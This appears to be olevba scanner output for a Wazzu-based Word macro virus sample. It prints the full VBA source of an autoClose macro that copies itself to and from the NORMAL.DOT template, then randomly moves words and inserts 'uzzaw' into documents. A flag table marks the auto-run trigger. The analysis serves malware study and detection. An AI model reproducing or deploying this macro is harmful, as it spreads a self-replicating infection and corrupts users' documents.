olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-10dc9c30ce5f4e4e27a14b6c31095b80de9c07ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-10dc9c30ce5f4e4e27a14b6c31095b80de9c07ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoClose.bas 
in file: Virus.MSWord.Wazzu-based-10dc9c30ce5f4e4e27a14b6c31095b80de9c07ed - OLE stream: 'Macros/VBA/autoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
        On Error GoTo -1: On Error GoTo errCaught
                
        WordBasic.FileSummaryInfo Update:=1
        Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
        WordBasic.CurValues.FileSummaryInfo dlg

        fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoClose"
        globMacro$ = "Global:autoClose"
        MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

        If MacroFile$ = "NORMAL.DOT" Then
                WordBasic.MacroCopy globMacro$, fileMacro$
                WordBasic.FileSaveAs Format:=1
        Else
                WordBasic.MacroCopy fileMacro$, globMacro$
        End If

        daolyaP

GoTo bye
errCaught:

bye:
        On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub daolyaP()
Dim i
Dim selWord$
        For i = 1 To 3
                If Rnd() < 0.2 Then
                        droWdnR
                        WordBasic.SelectCurWord
                        selWord$ = WordBasic.[Selection$]()
                        WordBasic.DeleteWord

                        droWdnR
                        WordBasic.Insert selWord$ + " "
                End If
        Next

        If Rnd() < 0.25 Then
                droWdnR
                WordBasic.Insert "uzzaw "
                WordBasic.StartOfDocument
        End If

End Sub

Private Sub droWdnR()
Dim wordNum
        WordBasic.FileSummaryInfo Update:=1
        Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
        WordBasic.CurValues.DocumentStatistics dlg

        wordNum = WordBasic.Int(Rnd() * WordBasic.Val(dlg.Words))
        WordBasic.StartOfDocument
        WordBasic.WordRight wordNum
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

